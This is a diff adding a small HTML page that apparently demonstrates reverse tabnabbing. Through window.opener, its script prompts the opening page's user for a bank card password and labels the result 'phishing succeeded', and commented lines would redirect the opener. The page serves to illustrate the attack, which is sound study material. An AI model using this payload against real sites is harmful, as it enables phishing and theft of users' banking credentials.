@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>other page</title>
+</head>
+<body>
+  <div></div>
+  <script>
+    var elements = document.getElementsByTagName('div');
+    if(window.opener) {
+      elements[0].innerHTML = "钓鱼成功了";
+      opener.confirm('输入你的银行卡密码？')
+      // opener.body.style.background = 'red'
+      // opener.location = "./target-blank.html?money=10000";
+    } else{
+      elements[0].innerHTML = "钓鱼失败了";
+    }
+  </script>
+</body>
+</html>
